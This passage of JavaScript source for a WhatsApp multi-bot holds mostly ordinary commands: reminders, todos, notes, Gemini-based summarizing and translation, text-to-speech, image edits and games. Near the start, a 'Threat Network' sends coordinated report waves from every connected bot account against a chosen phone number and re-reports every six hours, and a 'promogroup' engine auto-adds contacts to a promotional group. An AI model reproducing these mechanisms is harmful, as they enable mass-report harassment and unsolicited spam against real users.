                const noteParts = (parts[2] && REPORT_CATEGORIES.includes(parts[2].toLowerCase())) ? parts.slice(3) : parts.slice(2);
                const note = noteParts.join(" ").trim();
                addThreat(cleanNum, sock.user?.id, cat, note);
                const totalBots = Object.values(activeSockets).filter(s => s?.user).length;
                await reply(`🚨 *Threat Network engaged.*\n\n• Target: +${cleanNum}\n• Category: ${cat}\n• Bots in wave: ${totalBots}\n• Stagger: 5-15s\n\n_Running in background. You'll get a summary DM when done._`);
                runReportWaveAcrossAllBots(cleanNum, cat, { staggerSec: 8 }).then(res => {
                    sock.sendMessage(senderJid, { text: `✅ *Report wave complete*\n\n• Target: +${cleanNum}\n• Bots succeeded: ${res.ok}/${res.totalBots}\n• Failed: ${res.fail}\n\nNext re-report in 6h.` }).catch(() => {});
                }).catch(e => { sock.sendMessage(senderJid, { text: `⚠️ Report wave error: ${e?.message}` }).catch(() => {}); });
                break;
            }

            case ".threats": {
                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
                const d = loadThreats();
                const ents = Object.entries(d);
                if (!ents.length) return reply("🛡️ No threats logged yet.");
                let txt = `🛡️ *Global Threat Network*\n━━━━━━━━━━━━━━━━━━━\nTotal: *${ents.length}*\n\n`;
                ents.sort((a, b) => (b[1].lastSeen || 0) - (a[1].lastSeen || 0)).slice(0, 25).forEach(([num, t]) => {
                    const bots = t.botActions ? Object.keys(t.botActions).length : 0;
                    txt += `• +${num} — ${t.primaryCategory || "scam"} • ${t.reports?.length || 0}rpt • ${bots} bots • triggers:${t.triggerCount || 0}\n`;
                });
                if (ents.length > 25) txt += `\n_…and ${ents.length - 25} more._`;
                txt += `\n\nUse *.threatinfo <num>* for details, *.unthreat <num>* to remove.`;
                await reply(txt);
                break;
            }

            case ".threatinfo": {
                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
                const cleanNum = normalizeNum(parts[1]);
                if (!cleanNum) return reply("Usage: *.threatinfo <num>*");
                const t = getThreat(cleanNum);
                if (!t) return reply("⚠️ Not in threat network.");
                let txt = `🛡️ *Threat: +${cleanNum}*\n━━━━━━━━━━━━━━━━━━━\n`;
                txt += `Category: ${t.primaryCategory}\nSeverity: ${t.severity}\nFirst reported: ${new Date(t.firstReported).toLocaleString("en-NG", { timeZone: "Africa/Lagos" })}\nLast seen: ${new Date(t.lastSeen).toLocaleString("en-NG", { timeZone: "Africa/Lagos" })}\nTrigger hits: ${t.triggerCount || 0}\n\n*Reports (${t.reports.length}):*\n`;
                t.reports.slice(-5).forEach(r => txt += `• ${r.category} — ${r.note || "(no note)"} — ${new Date(r.at).toLocaleDateString("en-NG")}\n`);
                txt += `\n*Bot actions:*\n`;
                for (const [bj, a] of Object.entries(t.botActions || {})) txt += `• ${bj.split("@")[0]}: blocked=${a.blocked} reports=${a.reportCount || 0}\n`;
                await reply(txt);
                break;
            }

            case ".unthreat": {
                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
                const cleanNum = normalizeNum(parts[1]);
                if (!cleanNum) return reply("Usage: *.unthreat <num>*");
                if (removeThreat(cleanNum)) await reply(`✅ Removed +${cleanNum} from threat network.`);
                else await reply("⚠️ Number not found in threat network.");
                break;
            }

            // ════════════════════════════════════════
            // ░░░░░ PROMOGROUP (DEV ONLY) ░░░░░
            // ════════════════════════════════════════
            case ".promogroup": {
                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
                const sub = (parts[1] || "").toLowerCase();
                const cfg = loadPromoGroup();
                if (!sub || sub === "status") {
                    const totalAdded = Object.values(cfg.added).reduce((a, o) => a + Object.keys(o).length, 0);
                    return reply(`📈 *PromoGroup Engine*\n━━━━━━━━━━━━━━━━━━━\nStatus: ${cfg.enabled ? (cfg.paused ? "⏸️ paused" : "🟢 running") : "🔴 off"}\nGroup: ${cfg.groupJid || "(not set)"}\nLink: ${cfg.groupLink || "(not set)"}\nRate: *${cfg.rate}/cycle*\nInterval: every *${cfg.intervalHours}h* per bot\nPool: ${cfg.poolAuto ? "auto (contacts)" : "manual only"}\nManual pool: ${cfg.manualPool.length}\nOpted-out: ${cfg.optedOut.length}\n\n*Stats*\nAdded: ${cfg.stats.totalAdded}\nInvited (DM): ${cfg.stats.totalInvited}\nFailed: ${cfg.stats.totalFailed}\nUnique adds: ${totalAdded}\n\n*Subcommands:*\n.promogroup setgroup <jid> <link>\n.promogroup rate <n>\n.promogroup interval <hours>\n.promogroup on | off | pause | resume\n.promogroup pool auto | manual\n.promogroup add <num> | remove <num> | optout <num>\n.promogroup runnow\n.promogroup reset`);
                }
                if (sub === "setgroup") {
                    if (!parts[2]) return reply("Usage: *.promogroup setgroup <group@g.us> <invite_link>*");
                    cfg.groupJid = parts[2];
                    if (parts[3]) cfg.groupLink = parts[3];
                    savePromoGroup(cfg); return reply(`✅ Group set.\nJID: ${cfg.groupJid}\nLink: ${cfg.groupLink}`);
                }
                if (sub === "rate") { cfg.rate = Math.max(1, Math.min(10, parseInt(parts[2]) || 2)); savePromoGroup(cfg); return reply(`✅ Rate set to *${cfg.rate}/cycle*.`); }
                if (sub === "interval") { cfg.intervalHours = Math.max(1, Math.min(168, parseInt(parts[2]) || 24)); savePromoGroup(cfg); return reply(`✅ Interval set to *${cfg.intervalHours}h*.`); }
                if (sub === "on") { if (!cfg.groupJid) return reply("❌ Set the group first: *.promogroup setgroup <jid> <link>*"); cfg.enabled = true; cfg.paused = false; savePromoGroup(cfg); return reply("🟢 PromoGroup *ON*."); }
                if (sub === "off") { cfg.enabled = false; savePromoGroup(cfg); return reply("🔴 PromoGroup *OFF*."); }
                if (sub === "pause") { cfg.paused = true; savePromoGroup(cfg); return reply("⏸️ PromoGroup paused."); }
                if (sub === "resume") { cfg.paused = false; savePromoGroup(cfg); return reply("▶️ PromoGroup resumed."); }
                if (sub === "pool") { cfg.poolAuto = (parts[2] || "auto").toLowerCase() === "auto"; savePromoGroup(cfg); return reply(`✅ Pool set to *${cfg.poolAuto ? "auto" : "manual"}*.`); }
                if (sub === "add") { const n = normalizeNum(parts[2]); if (!n) return reply("Usage: .promogroup add <num>"); if (!cfg.manualPool.includes(n)) cfg.manualPool.push(n); savePromoGroup(cfg); return reply(`✅ Added +${n} to manual pool.`); }
                if (sub === "remove") { const n = normalizeNum(parts[2]); cfg.manualPool = cfg.manualPool.filter(x => x !== n); savePromoGroup(cfg); return reply(`✅ Removed +${n} from manual pool.`); }
                if (sub === "optout") { const n = normalizeNum(parts[2]); if (!cfg.optedOut.includes(n)) cfg.optedOut.push(n); savePromoGroup(cfg); return reply(`✅ +${n} will never be contacted.`); }
                if (sub === "runnow") { await reply("⏳ Running cycle for this bot…"); runPromoGroupCycleForBot(sock).then(() => sock.sendMessage(senderJid, { text: "✅ Cycle done. Check *.promogroup status*." })).catch(e => sock.sendMessage(senderJid, { text: `⚠️ ${e?.message}` })); return; }
                if (sub === "reset") { cfg.added = {}; cfg.skipped = {}; cfg.lastRun = {}; cfg.stats = { totalAdded: 0, totalInvited: 0, totalFailed: 0 }; savePromoGroup(cfg); return reply("🧹 Stats + history cleared."); }
                return reply("Unknown subcommand. Send *.promogroup* alone for help.");
            }

            // ════════════════════════════════════════
            // ░░░░░ PRODUCTIVITY ░░░░░
            // ════════════════════════════════════════
            case ".remind": {
                const sub = (parts[1] || "").toLowerCase();
                const arr = loadReminders();
                if (sub === "list") {
                    const mine = arr.filter(r => r.userJid === senderJid).sort((a, b) => a.fireAt - b.fireAt);
                    if (!mine.length) return reply("📭 No active reminders. Set one with *.remind <time> <text>*");
                    let t = "⏰ *Your Reminders*\n━━━━━━━━━━━━━━━\n";
                    mine.forEach(r => t += `• [${r.id}] in ${fmtDuration(r.fireAt - Date.now())} — ${r.text}\n`);
                    return reply(t);
                }
                if (sub === "delete" || sub === "del") {
                    const id = parts[2];
                    if (!id) return reply("Usage: *.remind del <id>*");
                    const next = arr.filter(r => !(r.id === id && r.userJid === senderJid));
                    if (next.length === arr.length) return reply("⚠️ Not found.");
                    saveReminders(next); return reply(`🗑️ Deleted reminder *${id}*.`);
                }
                const dur = parseDuration(parts[1]);
                if (!dur) return reply(`⏰ *Reminders*\n\nUsage:\n*.remind <duration> <text>*\n  e.g. .remind 30m drink water\n  e.g. .remind 2h30m call mum\n  e.g. .remind 1d submit report\n\n*.remind list*  — view\n*.remind del <id>*  — cancel`);
                const text = parts.slice(2).join(" ").trim();
                if (!text) return reply("❌ Add the reminder text after the time.");
                const entry = { id: shortId(), chatJid: from, userJid: senderJid, text, fireAt: Date.now() + dur, botJid: sock.user?.id, createdAt: Date.now() };
                arr.push(entry); saveReminders(arr);
                armReminder(entry, () => sock);
                return reply(`✅ Reminder set!\n• ID: *${entry.id}*\n• Fires in: *${fmtDuration(dur)}*\n• Text: ${text}`);
            }

            case ".todo": {
                const sub = (parts[1] || "").toLowerCase();
                const all = loadTodos();
                if (!all[senderJid]) all[senderJid] = [];
                const list = all[senderJid];
                if (!sub || sub === "list") {
                    if (!list.length) return reply("📝 Your todo list is empty. Add: *.todo add <task>*");
                    let t = `📝 *Your Todos* (${list.filter(x => !x.done).length} open)\n━━━━━━━━━━━━━━━\n`;
                    list.forEach((x, i) => t += `${x.done ? "✅" : "⬜"} ${i + 1}. ${x.text}\n`);
                    t += `\n*.todo add <task>* | *.todo done <n>* | *.todo del <n>* | *.todo clear*`;
                    return reply(t);
                }
                if (sub === "add") {
                    const text = parts.slice(2).join(" ").trim();
                    if (!text) return reply("Usage: *.todo add <task>*");
                    list.push({ text, done: false, at: Date.now() }); saveTodos(all);
                    return reply(`✅ Added: ${text}`);
                }
                if (sub === "done") {
                    const i = parseInt(parts[2]) - 1;
                    if (isNaN(i) || !list[i]) return reply("⚠️ Invalid number.");
                    list[i].done = true; saveTodos(all); return reply(`✅ Marked done: ${list[i].text}`);
                }
                if (sub === "del") {
                    const i = parseInt(parts[2]) - 1;
                    if (isNaN(i) || !list[i]) return reply("⚠️ Invalid number.");
                    const removed = list.splice(i, 1); saveTodos(all); return reply(`🗑️ Deleted: ${removed[0].text}`);
                }
                if (sub === "clear") { all[senderJid] = []; saveTodos(all); return reply("🧹 Todo list cleared."); }
                return reply("Unknown subcommand. Try *.todo*.");
            }

            case ".note": {
                const sub = (parts[1] || "").toLowerCase();
                const all = loadNotes();
                if (!all[senderJid]) all[senderJid] = {};
                const myNotes = all[senderJid];
                if (!sub || sub === "list") {
                    const keys = Object.keys(myNotes);
                    if (!keys.length) return reply("📒 No notes yet.\n\n*.note save <name> <text>*\n*.note get <name>*\n*.note del <name>*");
                    return reply(`📒 *Your Notes*\n━━━━━━━━━━━━━\n${keys.map(k => `• ${k}`).join("\n")}\n\n*.note get <name>* to view`);
                }
                if (sub === "save") {
                    const name = parts[2]; const text = parts.slice(3).join(" ").trim();
                    if (!name || !text) return reply("Usage: *.note save <name> <text>*");
                    myNotes[name] = { text, at: Date.now() }; saveNotes(all); return reply(`💾 Note *${name}* saved.`);
                }
                if (sub === "get") {
                    const name = parts[2]; if (!name || !myNotes[name]) return reply("⚠️ Note not found.");
                    return reply(`📒 *${name}*\n━━━━━━━━━━━━━\n${myNotes[name].text}`);
                }
                if (sub === "del") {
                    const name = parts[2]; if (!myNotes[name]) return reply("⚠️ Not found.");
                    delete myNotes[name]; saveNotes(all); return reply(`🗑️ Deleted note *${name}*.`);
                }
                return reply("Unknown subcommand.");
            }

            case ".timer": {
                const sub = (parts[1] || "").toLowerCase();
                if (sub === "list") {
                    const mine = loadTimers().filter(t => t.userJid === senderJid);
                    if (!mine.length) return reply("⏱️ No active timers.");
                    let t = "⏱️ *Your Timers*\n━━━━━━━━━━━\n";
                    mine.forEach(x => t += `• [${x.id}] ${fmtDuration(x.fireAt - Date.now())} left ${x.label ? `— ${x.label}` : ""}\n`);
                    return reply(t);
                }
                if (sub === "stop") {
                    const id = parts[2]; const arr = loadTimers();
                    const next = arr.filter(t => !(t.id === id && t.userJid === senderJid));
                    if (next.length === arr.length) return reply("⚠️ Not found.");
                    saveTimers(next); return reply(`🛑 Timer *${id}* stopped.`);
                }
                const dur = parseDuration(parts[1]);
                if (!dur) return reply(`⏱️ *Timer*\n\n*.timer 5m [label]*\n*.timer list*\n*.timer stop <id>*`);
                const label = parts.slice(2).join(" ").trim();
                const entry = { id: shortId(), chatJid: from, userJid: senderJid, fireAt: Date.now() + dur, label, botJid: sock.user?.id };
                const arr = loadTimers(); arr.push(entry); saveTimers(arr);
                armTimer(entry, () => sock);
                return reply(`⏱️ Timer started: *${fmtDuration(dur)}*${label ? `\nLabel: ${label}` : ""}\nID: *${entry.id}*`);
            }

            case ".countdown": {
                const sub = (parts[1] || "").toLowerCase();
                const all = loadCountdowns();
                if (!all[senderJid]) all[senderJid] = {};
                if (!sub || sub === "list") {
                    const ents = Object.entries(all[senderJid]);
                    if (!ents.length) return reply("📅 No countdowns.\n\n*.countdown set <name> <YYYY-MM-DD>*\n*.countdown del <name>*");
                    let t = "📅 *Your Countdowns*\n━━━━━━━━━━━━\n";
                    ents.forEach(([name, c]) => {
                        const days = Math.ceil((c.target - Date.now()) / 86400000);
                        t += `• *${name}* — ${days >= 0 ? `${days} days to go` : `${Math.abs(days)} days ago`} (${c.dateStr})\n`;
                    });
                    return reply(t);
                }
                if (sub === "set") {
                    const name = parts[2]; const dateStr = parts[3];
                    if (!name || !dateStr) return reply("Usage: *.countdown set <name> <YYYY-MM-DD>*");
                    const dt = new Date(dateStr + "T12:00:00+01:00");
                    if (isNaN(dt.getTime())) return reply("❌ Invalid date.");
                    all[senderJid][name] = { target: dt.getTime(), dateStr, at: Date.now() };
                    saveCountdowns(all); return reply(`✅ Countdown *${name}* → ${dateStr}`);
                }
                if (sub === "del") {
                    const name = parts[2]; if (!all[senderJid][name]) return reply("⚠️ Not found.");
                    delete all[senderJid][name]; saveCountdowns(all); return reply(`🗑️ Deleted *${name}*.`);
                }
                return reply("Unknown subcommand.");
            }

            case ".calendar": {
                const now = new Date();
                const yr = parseInt(parts[1]) || now.getFullYear();
                const mo = parts[2] ? parseInt(parts[2]) - 1 : now.getMonth();
                if (mo < 0 || mo > 11) return reply("❌ Month must be 1-12.");
                const all = loadCountdowns();
                const marks = {};
                for (const c of Object.values(all[senderJid] || {})) {
                    const dt = new Date(c.target);
                    if (dt.getFullYear() === yr && dt.getMonth() === mo) marks[dt.getDate()] = c.dateStr;
                }
                return reply("```\n" + buildCalendar(yr, mo, marks) + "\n```\n_Tip: *.countdown set <name> <date>* adds events._");
            }

            // ════════════════════════════════════════
            // ░░░░░ AI EXTRA ░░░░░
            // ════════════════════════════════════════
            case ".summarize": {
                const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                let txt = parts.slice(1).join(" ").trim();
                if (!txt && quoted) txt = quoted.conversation || quoted.extendedTextMessage?.text || quoted.imageMessage?.caption || "";
                if (!txt) return reply("📝 *Summarize*\n\nReply to a long message with *.summarize* or paste text after the command.");
                await reply("⏳ Summarizing…");
                try {
                    const r = await callGemini(`Summarize the following text in 3-5 concise bullet points. Be clear and skip filler.\n\nTEXT:\n${txt.slice(0, 8000)}`, { temperature: 0.3 });
                    return reply(`📝 *Summary*\n━━━━━━━━━━━━\n${r}`);
                } catch (e) { return reply(`❌ ${e?.message}`); }
            }

            case ".atranslate": {
                const m = parts[1]; const to = (parts[2] || "en").toLowerCase();
                const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                let txt = parts.slice(m ? 1 : 0).join(" ").trim();
                if (!txt && quoted) txt = quoted.conversation || quoted.extendedTextMessage?.text || "";
                if (!txt) return reply("🌐 *AI Translate*\n\n*.atranslate <text> <lang>*\n_Reply to a msg with *.atranslate <lang>* (e.g. en, yo, ig, ha, fr, es, ar)_");
                const langArg = parts[parts.length - 1].toLowerCase();
                const looksLikeLang = /^[a-z]{2,3}$/.test(langArg);
                const target = looksLikeLang ? langArg : "en";
                const body = looksLikeLang ? parts.slice(1, -1).join(" ").trim() || txt : txt;
                await reply(`⏳ Translating to *${target}*…`);
                try {
                    const r = await callGemini(`Translate the following text to ${target}. Output only the translation, no commentary.\n\nTEXT:\n${body}`, { temperature: 0.2 });
                    return reply(`🌐 *${target.toUpperCase()}*\n━━━━━━━━━━\n${r}`);
                } catch (e) { return reply(`❌ ${e?.message}`); }
            }

            case ".codereview": {
                const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                let code = parts.slice(1).join(" ").trim();
                if (!code && quoted) code = quoted.conversation || quoted.extendedTextMessage?.text || "";
                if (!code) return reply("🔍 *Code Review*\n\nReply to a code snippet with *.codereview* (static analysis only — no execution).");
                await reply("⏳ Reviewing…");
                try {
                    const r = await callGemini(`Act as a senior engineer doing a code review. Identify bugs, security issues, and improvements. Be specific and actionable. DO NOT execute anything — static review only.\n\nCODE:\n\`\`\`\n${code.slice(0, 8000)}\n\`\`\``, { temperature: 0.3 });
                    return reply(`🔍 *Code Review*\n━━━━━━━━━━━━\n${r}`);
                } catch (e) { return reply(`❌ ${e?.message}`); }
            }

            case ".code": {
                const prompt = parts.slice(1).join(" ").trim();
                if (!prompt) return reply("💻 *Code Generator*\n\n*.code <what to build>*\nExample: *.code python script that downloads YouTube videos*");
                await reply("⏳ Generating…");
                try {
                    const r = await callGemini(`Write production-ready code for this request. Include brief usage notes after the code block. Pick the best language unless specified.\n\nREQUEST: ${prompt}`, { temperature: 0.4 });
                    return reply(`💻 *Code*\n━━━━━━━━\n${r}`);
                } catch (e) { return reply(`❌ ${e?.message}`); }
            }

            case ".explain": {
                const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                let q = parts.slice(1).join(" ").trim();
                if (!q && quoted) q = quoted.conversation || quoted.extendedTextMessage?.text || "";
                if (!q) return reply("🧠 *Explain*\n\n*.explain <topic>* — or reply to anything with *.explain*");
                await reply("⏳ Thinking…");
                try {
                    const r = await callGemini(`Explain this clearly and simply, like talking to a smart friend. Use examples where helpful. Keep it tight.\n\nTOPIC:\n${q.slice(0, 4000)}`, { temperature: 0.5 });
                    return reply(`🧠 *Explain*\n━━━━━━━━━━\n${r}`);
                } catch (e) { return reply(`❌ ${e?.message}`); }
            }

            case ".persona": {
                const sub = (parts[1] || "").toLowerCase();
                const scope = from;
                if (!sub || sub === "show") {
                    const p = getPersona(scope);
                    return reply(p ? `🎭 *Active persona for this chat:*\n\n${p}` : "🎭 No persona set for this chat.\n\n*.persona set <description>*\n*.persona clear*\n_Then use *.aichat <msg>* to chat with the persona._");
                }
                if (sub === "set") {
                    const text = parts.slice(2).join(" ").trim();
                    if (!text) return reply("Usage: *.persona set <description>*\nExample: *.persona set a savage Lagos slang comedian who roasts gently*");
                    setPersona(scope, text); return reply(`✅ Persona set for this chat. Use *.aichat <msg>* to talk to it.`);
                }
                if (sub === "clear") { clearPersona(scope); return reply("🧹 Persona cleared."); }
                return reply("Unknown subcommand.");
            }

            case ".aichat": {
                const KEY = process.env.GEMINI_API_KEY;
                if (!KEY) return reply("⚠️ Set GEMINI_API_KEY first. Get a free one at https://aistudio.google.com/app/apikey");
                const text = parts.slice(1).join(" ").trim();
                if (!text) return reply("💬 *.aichat <message>* — chats with the persona of this chat (or default if none set).");
                const persona = getPersona(from) || "You are Phantom X, a friendly bot assistant. Be helpful and concise.";
                try {
                    const r = await callGemini(text, { system: persona, temperature: 0.8 });
                    return reply(r);
                } catch (e) { return reply(`❌ ${e?.message}`); }
            }

            // ════════════════════════════════════════
            // ░░░░░ TTS ░░░░░
            // ════════════════════════════════════════
            case ".tts":
            case ".voice":
            case ".tovn": {
                const sub = command === ".tts" ? parts[1] : null;
                let lang = "en"; let text;
                if (command === ".tts" && /^[a-z]{2,3}$/i.test(sub || "")) { lang = sub.toLowerCase(); text = parts.slice(2).join(" ").trim(); }
                else text = parts.slice(1).join(" ").trim();
                if (!text) {
                    const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                    if (quoted) text = quoted.conversation || quoted.extendedTextMessage?.text || "";
                }
                if (!text) return reply(`🔊 *Text-to-Speech*\n\n*.tts <text>* (English)\n*.tts yo Bawo ni* (Yoruba — try en, yo, ig, ha, fr, es, ar, sw…)\n*.voice <text>* — same\n*.tovn <text>* — sends as voice note\n\n_Reply to a message with .tovn to convert it._`);
                try {
                    await reply("🎙️ Generating audio…");
                    const buf = await googleTts(text, lang);
                    if (command === ".tovn") return await sock.sendMessage(from, { audio: buf, mimetype: "audio/mp4", ptt: true }, { quoted: msg });
                    return await sock.sendMessage(from, { audio: buf, mimetype: "audio/mp4", ptt: false }, { quoted: msg });
                } catch (e) { return reply(`❌ TTS failed: ${e?.message}`); }
            }

            // ════════════════════════════════════════
            // ░░░░░ IMAGE EDITOR ░░░░░
            // ════════════════════════════════════════
            case ".blur":
            case ".invert":
            case ".grayscale":
            case ".brighten":
            case ".darken":
            case ".sharpen":
            case ".pixelate":
            case ".cartoon": {
                const op = command.slice(1);
                const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                const isImageHere = msg.message?.imageMessage;
                const target = quoted && getContentType(quoted) === "imageMessage" ? { ...msg, message: quoted } : (isImageHere ? msg : null);
                if (!target) return reply(`🖼️ Reply to (or send) an image with *.${op}*`);
                try {
                    const buf = await downloadMediaMessage(target, "buffer", {}, { logger: pino({ level: "silent" }) });
                    const out = await applyImageOp(buf, op, { amount: parts[1] });
                    return await sock.sendMessage(from, { image: out, caption: `✨ ${op}` }, { quoted: msg });
                } catch (e) { return reply(`❌ ${e?.message}`); }
            }

            case ".removebg":
            case ".upscale": {
                const op = command.slice(1);
                const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                const isImageHere = msg.message?.imageMessage;
                const target = quoted && getContentType(quoted) === "imageMessage" ? { ...msg, message: quoted } : (isImageHere ? msg : null);
                if (!target) return reply(`🖼️ Reply to an image with *.${op}*`);
                await reply(`⏳ ${op === "removebg" ? "Removing background" : "Upscaling"}…`);
                try {
                    const buf = await downloadMediaMessage(target, "buffer", {}, { logger: pino({ level: "silent" }) });
                    const out = op === "removebg" ? await removeBgRemote(buf) : await upscaleRemote(buf);
                    return await sock.sendMessage(from, { image: out, caption: `✨ ${op}` }, { quoted: msg });
                } catch (e) { return reply(`❌ ${e?.message}`); }
            }

            // ════════════════════════════════════════
            // ░░░░░ GAMES ░░░░░
            // ════════════════════════════════════════
            case ".math": {
                if (mathState[from] && parts[0] && !isNaN(Number(parts[0]))) { /* won't reach: parts[0]=cmd */ }
                if (parts[1]?.toLowerCase() === "stop") { delete mathState[from]; return reply("🛑 Math stopped."); }
                if (mathState[from] && parts[1]) {
                    const ans = Number(parts[1]);
                    if (isNaN(ans)) return reply("Reply with a number, or *.math stop*.");
                    if (ans === mathState[from].answer) { const t = mathState[from]; delete mathState[from]; return reply(`🎉 Correct! *${t.q} = ${t.answer}*\nNew round: *.math*`); }
                    return reply(`❌ Wrong. Try again or *.math stop*.`);
                }
                const ops = ["+", "-", "*"];
                const op = ops[Math.floor(Math.random() * ops.length)];
                const a = Math.floor(Math.random() * (op === "*" ? 13 : 100)) + 1;
                const b = Math.floor(Math.random() * (op === "*" ? 13 : 100)) + 1;
                const ans = op === "+" ? a + b : op === "-" ? a - b : a * b;
                mathState[from] = { q: `${a} ${op} ${b}`, answer: ans, at: Date.now() };
                return reply(`🧮 *Math Challenge*\n\nWhat is *${a} ${op} ${b}* ?\n\nReply: *.math <answer>* (or *.math stop*)`);
            }

            case ".guessflag": {
                if (parts[1]?.toLowerCase() === "stop") { delete guessFlagState[from]; return reply("🛑 Stopped."); }
                if (guessFlagState[from] && parts[1]) {
                    const guess = parts.slice(1).join(" ").trim().toLowerCase();
                    const ans = guessFlagState[from].name.toLowerCase();
                    if (guess === ans || ans.includes(guess) || guess.includes(ans)) { const f = guessFlagState[from]; delete guessFlagState[from]; return reply(`🎉 Correct! It was *${f.name}* ${f.flag}\n\nNew: *.guessflag*`); }
                    guessFlagState[from].tries = (guessFlagState[from].tries || 0) + 1;
                    if (guessFlagState[from].tries >= 3) { const f = guessFlagState[from]; delete guessFlagState[from]; return reply(`❌ Out of tries! It was *${f.name}* ${f.flag}`); }
                    return reply(`❌ Wrong (${3 - guessFlagState[from].tries} tries left).`);
                }
                const f = FLAGS[Math.floor(Math.random() * FLAGS.length)];
                guessFlagState[from] = { flag: f.e, name: f.n, tries: 0, at: Date.now() };
                return reply(`🌍 *Guess the Flag*\n\nWhich country is this?\n\n# ${f.e}\n\nReply: *.guessflag <country>* (3 tries)`);
            }

            case ".typingtest": {
                if (parts[1]?.toLowerCase() === "stop") { delete typingTestState[from]; return reply("🛑 Stopped."); }
                if (typingTestState[from] && parts[1]) {
                    const typed = parts.slice(1).join(" ").trim();
                    const t = typingTestState[from];
                    delete typingTestState[from];
                    const elapsed = (Date.now() - t.startedAt) / 1000;
                    const targetWords = t.sentence.trim().split(/\s+/);
                    const typedWords = typed.trim().split(/\s+/);
                    let correct = 0;
                    for (let i = 0; i < targetWords.length; i++) if (typedWords[i] === targetWords[i]) correct++;
                    const wpm = Math.round((correct / elapsed) * 60);
                    const acc = Math.round((correct / targetWords.length) * 100);
                    return reply(`⌨️ *Typing Test Result*\n━━━━━━━━━━━━━━\n• Time: ${elapsed.toFixed(1)}s\n• WPM: *${wpm}*\n• Accuracy: *${acc}%*\n• Correct words: ${correct}/${targetWords.length}\n\nNew: *.typingtest*`);
                }
                const sentence = TYPING_SENTENCES[Math.floor(Math.random() * TYPING_SENTENCES.length)];
                typingTestState[from] = { sentence, startedAt: Date.now() };
                return reply(`⌨️ *Typing Test*\n━━━━━━━━━━━━━\nType this *exactly* as fast as you can:\n\n_${sentence}_\n\nReply: *.typingtest <your typed text>*`);
            }

            case ".connect4": {
                const sub = (parts[1] || "").toLowerCase();
                if (sub === "stop" || sub === "end") { delete connect4State[from]; return reply("🛑 Game ended."); }
                let g = connect4State[from];
                if (!g || sub === "new" || sub === "start") {
                    g = { board: newC4Board(), turn: 1, players: { 1: senderJid, 2: null }, mode: "open", at: Date.now() };
                    connect4State[from] = g;
                    return reply(`🔴🟡 *Connect 4*\n\n${renderC4(g.board)}\nP1 (🔴): @${senderJid.split("@")[0]}\nP2 (🟡): waiting…\n\nAnother player: *.connect4 join*\nDrop a piece: *.connect4 <1-7>*`);
                }
                if (sub === "join") {
                    if (g.players[2]) return reply("⚠️ Already 2 players.");
                    if (g.players[1] === senderJid) return reply("⚠️ You're already P1.");
                    g.players[2] = senderJid;
                    return reply(`✅ Joined as P2 (🟡)!\n\n${renderC4(g.board)}\nP1's turn (🔴): @${g.players[1].split("@")[0]}\nDrop: *.connect4 <1-7>*`);
                }
                const col = parseInt(sub) - 1;
                if (isNaN(col) || col < 0 || col > 6) return reply("⚠️ Pick a column 1-7.");
                if (!g.players[2]) return reply("Need 2 players. *.connect4 join*");
                if (senderJid !== g.players[g.turn]) return reply("⏳ Not your turn.");
                const r = c4Drop(g.board, col, g.turn);
                if (r === -1) return reply("⚠️ Column full.");
                if (c4Wins(g.board, g.turn)) {
                    const w = g.players[g.turn]; delete connect4State[from];
                    return reply(`🏆 *@${w.split("@")[0]} WINS!*\n\n${renderC4(g.board)}`);
                }
                if (g.board.every(row => row.every(c => c !== 0))) { delete connect4State[from]; return reply(`🤝 *Draw!*\n\n${renderC4(g.board)}`); }
                g.turn = g.turn === 1 ? 2 : 1;
                return reply(`${renderC4(g.board)}\nNext: ${g.turn === 1 ? "🔴 P1" : "🟡 P2"} (@${g.players[g.turn].split("@")[0]})`);
            }

            case ".werewolf": {
                const sub = (parts[1] || "").toLowerCase();
                if (sub === "stop" || sub === "end") { delete werewolfState[from]; return reply("🛑 Werewolf ended."); }
                let g = werewolfState[from];
                if (!g || sub === "new") {
                    g = { phase: "lobby", players: [{ jid: senderJid }], roles: {}, votes: {}, alive: {}, at: Date.now(), host: senderJid };
                    werewolfState[from] = g;
                    return reply(`🐺 *Werewolf Lobby*\n━━━━━━━━━━━━\nHost: @${senderJid.split("@")[0]}\nPlayers (1):\n  • @${senderJid.split("@")[0]}\n\n*.werewolf join* — join\n*.werewolf begin* — start (need 4-6)\n*.werewolf stop* — cancel`);
                }
                if (sub === "join") {
                    if (g.phase !== "lobby") return reply("⚠️ Game already started.");
                    if (g.players.find(p => p.jid === senderJid)) return reply("⚠️ Already in.");
                    if (g.players.length >= 6) return reply("⚠️ Lobby full.");
                    g.players.push({ jid: senderJid });
                    return reply(`✅ Joined!\nPlayers (${g.players.length}):\n${g.players.map(p => `  • @${p.jid.split("@")[0]}`).join("\n")}`);
                }
                if (sub === "begin") {
                    if (senderJid !== g.host) return reply("⚠️ Only the host can begin.");
                    if (g.players.length < 4) return reply("⚠️ Need at least 4 players.");
                    const roles = WEREWOLF_ROLES.slice(0, g.players.length).sort(() => Math.random() - 0.5);
                    g.players.forEach((p, i) => { g.roles[p.jid] = roles[i]; g.alive[p.jid] = true; });
                    g.phase = "day"; g.day = 1;
                    for (const p of g.players) {
                        try { await sock.sendMessage(p.jid, { text: `🐺 *Werewolf*\n\nYour role: *${g.roles[p.jid].toUpperCase()}*\n\nKeep it secret. Discuss in the group, then *.werewolf vote @user*` }); } catch {}
                    }
                    return reply(`🌅 *Day 1 begins!*\n\nDiscuss who you suspect. Vote: *.werewolf vote @user*\n(Roles DM'd to each player.)`);
                }
                if (sub === "vote") {
                    if (g.phase !== "day") return reply("⚠️ Not voting time.");
                    if (!g.alive[senderJid]) return reply("💀 You're dead, no vote.");
                    const mention = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
                    if (!mention) return reply("Tag the player: *.werewolf vote @user*");
                    if (!g.alive[mention]) return reply("⚠️ That player isn't alive.");
                    g.votes[senderJid] = mention;
